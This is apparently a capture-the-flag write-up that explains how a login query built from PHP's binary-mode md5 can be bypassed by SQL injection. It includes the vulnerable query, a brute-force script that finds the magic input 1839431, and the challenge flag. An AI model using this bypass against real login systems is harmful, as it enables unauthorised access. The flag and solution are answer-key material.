# md5 password

## Problem
  md5('value', true);

## Solution
  Let's see the source. We can find that the most important part is
  ```mysql_query("select * from admin_password where password='".md5($ps,true)."'")```
  It concatenates query with **binary mode** md5. The binary mode md5 can make whatever output you want.
  And, in sql, if the condition is ```whatever='foo'='bar'```, it's considered as true.
  So what we'll do is to generate a string with binary mode md5 whose output contains ```'='```. For this, I simply coded for burte force.
  ```
  <?php

  $i = 0;
  while (strpos(md5(strval($i), true), "'='") === false) {
    $i ++;
  }

  echo $i;

  ```

  It gave me 1839431.

## Flag
  8c1402ffce6bcb6b019b66443f9a8d0f1fcf8906
